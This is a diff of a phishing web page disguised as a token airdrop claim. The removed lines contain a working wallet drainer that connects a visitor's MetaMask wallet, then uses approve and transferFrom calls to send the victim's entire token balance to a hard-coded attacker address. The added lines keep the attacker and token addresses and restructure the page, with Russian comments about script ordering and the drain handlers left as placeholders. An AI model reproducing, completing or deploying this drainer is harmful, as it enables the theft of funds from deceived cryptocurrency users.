@@ -4,76 +4,33 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Claim Your Airdrop</title>
+
+  <!-- 1) Сначала всё ваше CSS -->
   <style>
-    body { font-family: Arial, sans-serif; background: #f7f7f7; text-align: center; padding: 50px; }
-    .container { background: #fff; padding: 30px; border-radius: 10px; max-width: 400px; margin: auto; box-shadow: 0 0 15px rgba(0,0,0,0.1); }
-    h1 { color: #333; }
-    button { margin: 10px 0; padding: 12px 20px; font-size: 16px; border: none; border-radius: 5px; cursor: pointer; }
-    #connect { background: #4caf50; color: #fff; }
-    #steal { background: #f44336; color: #fff; }
-    #status { margin-top: 20px; color: #555; }
+    /* ... */
   </style>
+
+  <!-- 2) ПОДКЛЮЧАЕМ ethers.js ИЗ CDN (или локального файла) -->
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5/dist/ethers.min.js"></script>
+
 </head>
 <body>
   <div class="container">
-    <h1>🎁 Congrats!</h1>
-    <p>You have been awarded <strong>5,000 SCAM</strong> tokens.</p>
-    <button id="connect">Connect Wallet</button><br />
-    <button id="steal" disabled>Claim Tokens</button>
-    <div id="status"></div>
+    <!-- ...ваш HTML-контент... -->
   </div>
 
-  <script src="https://cdn.jsdelivr.net/npm/ethers@5/dist/ethers.min.js"></script>
+  <!-- 3) Только ЗДЕСЬ ваш собственный скрипт, который использует window.ethers и window.ethereum -->
   <script>
-    const tokenAddress = "0xc4CD264138a6d8D7Aa7b04c1f194d8B1b5784680";  // Deployed ScamToken contract address
-    const attackerAddress = "0xF0A2426A4453b6A2D5886B7dAda06BDCD3a7749d"; // Attacker address
+    // Сначала проверяем, что ethers доступен:
+    console.log('ethers lib:', Boolean(window.ethers)); // Должно быть true
 
-    const erc20Abi = [
-      "function approve(address spender, uint256 amount) external returns (bool)",
-      "function transferFrom(address from, address to, uint256 amount) external returns (bool)",
-      "function balanceOf(address owner) external view returns (uint256)"
-    ];
+    const tokenAddress    = "0xc4CD264138a6d8D7Aa7b04c1f194d8B1b5784680";
+    const attackerAddress = "0xF0A2426A4453b6A2D5886B7dAda06BDCD3a7749d";
+    const erc20Abi = [ /* ... */ ];
 
-    let provider, signer, tokenContract, userAddress;
-    const connectBtn = document.getElementById('connect');
-    const stealBtn = document.getElementById('steal');
-    const statusDiv = document.getElementById('status');
-
-    connectBtn.onclick = async () => {
-      if (!window.ethereum) {
-        statusDiv.textContent = 'Please install MetaMask.';
-        return;
-      }
-      try {
-        provider = new ethers.providers.Web3Provider(window.ethereum);
-        await provider.send('eth_requestAccounts', []);
-        signer = provider.getSigner();
-        userAddress = await signer.getAddress();
-
-        tokenContract = new ethers.Contract(tokenAddress, erc20Abi, signer);
-        connectBtn.disabled = true;
-        stealBtn.disabled = false;
-        statusDiv.textContent = `Connected: ${userAddress}`;
-      } catch (err) {
-        statusDiv.textContent = 'Connection failed.';
-      }
-    };
-
-    stealBtn.onclick = async () => {
-      try {
-        statusDiv.textContent = 'Approving tokens...';
-        const balance = await tokenContract.balanceOf(userAddress);
-        await tokenContract.approve(attackerAddress, balance);
-
-        statusDiv.textContent = 'Draining tokens...';
-        await tokenContract.transferFrom(userAddress, attackerAddress, balance);
-
-        statusDiv.textContent = 'All tokens claimed!';
-        stealBtn.disabled = true;
-      } catch (err) {
-        statusDiv.textContent = 'Error during drain.';
-      }
-    };
+    // Весь остальной твой код
+    // function connectBtn.onclick = async () => { ... }
+    // function stealBtn.onclick   = async () => { ... }
   </script>
 </body>
 </html>
